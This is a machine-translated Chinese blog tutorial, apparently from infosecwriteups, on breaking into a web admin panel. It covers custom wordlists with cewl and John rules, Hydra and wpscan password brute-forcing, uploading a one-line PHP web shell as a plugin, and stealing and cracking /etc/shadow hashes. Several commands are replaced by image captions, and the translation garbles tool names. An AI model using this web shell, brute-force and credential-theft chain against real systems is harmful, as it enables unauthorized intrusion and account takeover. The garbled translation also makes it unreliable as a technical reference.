# 如何成功攻击管理面板

> 原文：<https://infosecwriteups.com/how-to-attack-admin-panels-successfully-72c90eeb818c?source=collection_archive---------0----------------------->

## 以正确的方式攻击 Web 应用管理面板

![](img/2a98da02bad04d160b8affe9c3d7cfe5.png)

照片由[克里斯蒂娜@ wocintechchat.com](https://unsplash.com/@wocintechchat?utm_source=medium&utm_medium=referral)在 [Unsplash](https://unsplash.com?utm_source=medium&utm_medium=referral) 上拍摄

> 注意:教程对初学者不太友好

经过一些调整，你将在这里学到的东西可以应用于任何网络应用。本教程将涵盖常规的 CMS 和 WordPress 作为奖励。

## 工具:

*   **代理链**
*   **哈希德**
*   **Cewl**
*   约翰·雷普
*   ****Wpscan****
*   ****VM 卡莉****
*   ****九头蛇****

## **第一部分:**

**通过快速浏览***https://ww.acme.com***的源代码，我们找到了这个网站的登录面板。这一发现可能会带来多种可能性，但同时，不太容易利用，因为许多这些错误总是需要你有认证用户的权利。**

**大多数登录面板非常容易列举，这将有助于我们更快地完成这项工作。让我们假设*多丽丝*是***acme.com***的作者。作为作者，她只能安装*插件*。现在，我们将尝试使用以下步骤强行破解她的密码:**

**搜索网站上的单词**

**`*wc -l file.txt* **#Display the number of words in the file**`**

**不像成千上万关于这个主题的不切实际的教程，我们不会使用***sec list/rock you . txt***。对于多丽丝，你需要做一个个人词汇表。按照上面的命令，我们刮掉了*并定位了最少六个字符的单词( **-m 6** ，并编写了( **-w** )一个**自定义单词列表** (acme-recon.txt)。这一步对黑客来说非常关键。人们倾向于根据他们控制的网站来设置密码。许多作者喜欢链接他们的社交媒体账户。利用这一点，我们可以了解任何出生日期、猫的名字等等。通过了解这些信息，我们可以建立一个非常强大的单词表。***

***在得知她的生日后，我们会告诉收割者约翰在我们的清单上增加四个数字。我们将通过在 John 的配置文件中添加一些规则来实现这一点。在我们的例子中，我们需要 0 到 9 之间的任何数字(***【0–9】***)。***

***将规则添加到 john 配置文件***

***我们可能会改变我们的单词列表，它目前包括 201 个单词，现在规则已经添加到配置文件中，让我们使用下面的命令:***

***合并两个列表的命令***

> ***提示:制作两个相同的列表，一个将**的第一个字母大写，另一个小写，然后将它们合并。*****

*****奖励:你可能会喜欢这些工具*****

***[](/must-have-tools-for-hacking-c2b75b332d2c) [## 黑客必备工具

### 查找漏洞的有用工具

infosecwriteups.com](/must-have-tools-for-hacking-c2b75b332d2c) 

接下来，我们必须通过检查相关网页的 HTML 代码(**位于/account/login.php** )来理解我们想要强力攻击的 web 表单

登录表单源代码

**POST** 请求由 **/account/login.php** 处理，这是我们将提供给 **Hydra** 的 URL。因为我们使用单词表来定位用户 **Doris。**hydra 的最后一个参数是**/account/log in . PHP:user = Doris&password = ^password^**，其中 **password** 作为单词列表文件条目的占位符。

九头蛇攻击

为了阻止九头蛇找到多丽丝 T21 的密码，你需要在你输入错误密码时添加登录页面的结果。在这种情况下是“登录无效”*** 

## ***奖金:***

***如果网站是用 WordPress 制作的，事情就简单多了，只要重复所有的步骤来制作单词表，然后使用下面的命令来破解密码。您也可以使用`--usernames /tmp/userlist.txt`破解**用户名**:***

***`wpscan - url acme.com -U doris -P /tmp/yourwordlist.txt -t 4`***

## ***第二部分:***

***至此，我们才发现多丽丝的密码是 ***Acme1998*** 。现在，你有这种欣快的幸福感，因为你发现了一个很好的 bug。你去报案了。好吧，你错过了一个获得更大赏金的机会，这是大多数没有经验的猎人都会做的。***

***还记得我告诉你多丽丝可以安装插件吗？这是有原因的。您将使用她的权限安装 web shell。安装完 **web shell** 后，我们将控制域面板控件。怎么做？制作一个文件，命名为**whateveryouwant.php**，然后在里面添加以下内容:***

*****<？php 系统($ _ REQUEST[" cmd "])；？>*****

> ***注意:在这一点上，你所能做的，仅限于你的特权提升技能…***

***上传这个文件，就像这是一个普通的插件。导航到它的位置**acme.com/../shell.php?cmd=ifconfig**并测试它以确保它能工作。此时导航到 **/etc/passwd** 和**将其内容复制到一个 file.txt** ，对 **/etc/shadow 做同样的。**现在我们需要知道 shawdow 正在使用哪种散列。***

***标识哈希类型的哈希 id***

***为了用 JTR 破解**基于 Linux 的**散列，您需要首先使用 **unshadow** 实用程序来组合来自受损系统的 **passwd** 和 **shadow** 文件。***

***解除密码哈希的阴影***

***在这一点上，你有两个选择来获得**控制面板密码**，我们可以使用我们之前制作的相同的单词表，制作一个新的，或者添加一些新的参数，比如特殊字符。在某些情况下，我们可以简单地使用 John 内置的`--format=raw-md5`并相信我，它的内置功能是有效的。一开始我不是信徒，直到我破解了 10 多个密码！***

***要使用自己的单词表，请按照以下步骤操作:***

***约翰使用单词表***

## ***奖金:第二部分***

***[](https://medium.com/geekculture/how-to-attack-admin-panels-successfully-part-2-9316c3caad3a) [## 如何成功攻击管理面板第 2 部分

### 没有以正确的方式攻击 Web 应用管理面板？

medium.com](https://medium.com/geekculture/how-to-attack-admin-panels-successfully-part-2-9316c3caad3a) 

## 结论:

当你熟悉这些工具时，你将能够做的事情是无限的。永远记住，一些登录面板有规则，可能会阻止您的 IP 访问他们的网站。您只能在没有费率限制的登录面板上尝试。既然你已经到了这一步，**考虑订阅**更多即将到来的 infosec 教程。*** 

## ***来自 Infosec 的报道:Infosec 每天都有很多内容，很难跟上。[加入我们的每周简讯](https://weekly.infosecwriteups.com/)以 5 篇文章、4 个线程、3 个视频、2 个 GitHub Repos 和工具以及 1 个工作提醒的形式免费获取所有最新的 Infosec 趋势！***